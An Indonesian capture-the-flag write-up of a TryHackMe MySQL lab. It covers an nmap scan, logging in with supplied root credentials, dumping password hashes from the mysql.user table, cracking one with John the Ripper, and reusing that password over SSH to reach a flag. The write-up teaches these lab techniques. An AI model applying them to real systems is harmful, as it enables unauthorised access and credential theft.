# Understanding msql

MySQL merupakan RDBMS (Relational Database Management System) yang berbasis pada SQL (Structured Query Language). RDBMS (Relational Database Management System) merupakan software yang digunakan untuk membuat dan memanage database berdasarkan pada relational model. Kata relational berarti data yang disimpan dalam dataset terorganisir dalam tabel atau beberapa tabel. Setiap tabel yang ada memiliki relasi dengan tabel lain berdasarkan '**primary_key**' atau '**key**' lain. MySQL menggunakan client-server model, yang mana digunakanlah bahasa SQL untuk saling berkomunikasi.

## How does MySQL work?

- MySQL membaut database untuk menyimpan dan memanipulasi data serta mendefinisikan hubungan antar tabel
- Client akan membuat requests dengan membuat statement atau command yang spesifik dengan SQL
- Server lalu akan merespon statement atau command tersebut dengan informasi apapun yang diminta melalui command.

# Enumerating

enumerate port dengan nmap seperti biasa

```shell
nmap -A -p- <IP target>
```

hasilnya seperti berikut

```shell
...
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d
...
513/tcp  filtered login
1996/tcp filtered tr-rsrb-port
3306/tcp open     mysql        MySQL 5.7.29-0ubuntu0.18.04.1
...
```

dari hasil enumerating, kita dapatkan 4 port yang terbuka, dan 2 port yang penting dalam hal ini adalah `22` dan `3306`. Selain itu, dalam bacaan yang disediakan, kita diberi credential '**root:password**', yang mana dapat digunakan untuk login ke mysql. Kita dapat login ke mysql dengan cara

```shell
mysql -h 10.10.119.140 -u root -p
Enter password: password
```

untuk langkah selanjutnya, dari TryHackMe sendiri memberi cara untuk extract informasi menggunakan metasploit, namun karena kita sudah dapat username dan password, kita sebenarnya dapat langsung untuk extract serta explore dengan SQL, disini akan dijelaskan 2 cara yaitu dengan Metasploit dan langsung di MySQL.

## Metasploit

cek versi MySQL dengan cara cari payload `mysql_sql`, lalu gunakan `auxiliary/admin/mysql/mysql_sql`, dan konfigurasi yang perlu dikonfigurasi yaitu username, password, dan rhosts. selanjutnya run, maka akan menghasilkan output versi mysql dan OS yang digunakan.

ganti konfigurasi pada SQL dengan `set sql "show database"`, maka nanti akan keluar jumlah database yang ada.

```sql
----------------------
| Database           |
----------------------
| information_schema |
| mysql              |
| performance_schema |
| sys                |
----------------------
```

## MySQL command

gunakan `select version()` maka nanti akan keluar versi dari mysql.

gunakan `show databases;` untuk melihat isi dari database

```sql
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

# Exploiting MySQL

## Metasploit

## MySQL

dari command `show databases;` tadi, kita dapat langsung menggunakan database '**mysql**' karena 3 lainnya termasuk default, gunakan dengan cara `SELECT mysql;`. lalu selanjutnya kita tampilkan tabel yang ada di db tersebut dengan cara `show tables;`, hasilnya seperti berikut

```sql
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| engine_cost               |
| ...                       |
| ...                       |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
```

dari tabel yang muncul, tentu paling menarik adalah '**user**'. maka kita dapat menampilkan apa saja isi dari tabel user dengan cara `SELECT * FROM user;`. Tentu hasilnya berantakan, kita dapat melihat beberapa kolom yang penting. kita coba untuk ambil User, password_expired, password_last_changed, dan password_lifetime dengan cara `SELECT User, password_expired, password_last_changed, password_lifetime From user;` hasilnya ternyata tidak sesuai ekspektasi, yaitu hanya informasi mengenai kapan password terakhir diubah dan hal lainnya namun tidak berisi informasi yang penting.

```sql
+------------------+------------------+-----------------------+-------------------+
| User             | password_expired | password_last_changed | password_lifetime |
+------------------+------------------+-----------------------+-------------------+
| root             | N                | 2020-04-23 10:13:41   |              NULL |
| mysql.session    | N                | 2020-04-23 10:13:44   |              NULL |
| mysql.sys        | N                | 2020-04-23 10:13:44   |              NULL |
| debian-sys-maint | N                | 2020-04-23 10:13:46   |              NULL |
| root             | N                | 2020-04-23 10:27:27   |              NULL |
| carl             | N                | 2020-04-23 12:05:26   |              NULL |
+------------------+------------------+-----------------------+-------------------+
```

kita coba ganti ke User dan authentication_string, dengan cara  `SELECT User, authentication_string From user;` dan hasilnya adalah

```sql
+------------------+-------------------------------------------+
| User             | authentication_string                     |
+------------------+-------------------------------------------+
| root             |                                           |
| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| debian-sys-maint | *D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E |
| root             | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
| carl             | *EA031893AA21444B170FC2162A56978B8CEECE18 |
+------------------+-------------------------------------------+
```

bravo! kita menemukan info penting! kita mendapatkan autentifikasi yang cukup penting dimana kita dapat credentials baru yaitu `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`. kita dapat store info ini ke file.txt untuk selanjutnya kita crack autentication string tersebut dengan menggunakann JTR! lakukan `echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > file.txt` lalu crack dengan JTR dengan cara

```shell
john file.txt
```

tunggu proses selesai... dan kita dapat hasilnya

```shell
...
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
doggie           (carl)
...
```

kita dapat credential baru dengan username dan password yaitu '**carl:doggie**'. kita dapat menggunakannya untuk coba login ke ssh service dengan cara

```shell
ssh carl@<IP target> -p 22

password: doggie
```

ternyata berhasil masuk! sellanjutnya kita `ls` dan kita menemukan file MySQL.txt, kita dapat `cat MySQL.txt` untuk melihat isinya, dan ternyata isinya adalah flag!